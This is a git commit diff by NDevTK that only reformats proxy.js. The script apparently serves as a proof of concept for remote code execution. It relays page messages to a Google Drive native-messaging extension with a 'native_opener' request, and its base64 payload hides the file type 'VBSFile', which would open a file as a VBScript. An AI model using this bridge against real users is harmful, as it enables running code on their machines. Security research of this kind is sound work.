f2b426c59478db39dd6779981e8668bf8ce24247
NDevTK <31563761+NDevTK@users.noreply.github.com>
2025-04-28 01:44:13 +0100

    Update proxy.js

--- proxy.js
+++ proxy.js
@@ -1,10 +1,12 @@
 window.addEventListener('message', e => {
-// Prevent RCE :)
-if (e.origin !== location.origin) return;
-
-console.log(e);
-
-let api = chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh', {name: 'com.google.drive.nativeproxy'});
-let request = 'native_opener/v2/3/' + btoa('["' + e.data.email + '", "' + e.data.ID + '","VkJTRmlsZQ",""]');
-api.postMessage(request);
+    // Prevent RCE :)
+    if (e.origin !== location.origin) return;
+    
+    console.log(e);
+    
+    let api = chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh', {
+        name: 'com.google.drive.nativeproxy'
+    });
+    let request = 'native_opener/v2/3/' + btoa('["' + e.data.email + '", "' + e.data.ID + '","VkJTRmlsZQ",""]');
+    api.postMessage(request);
 });
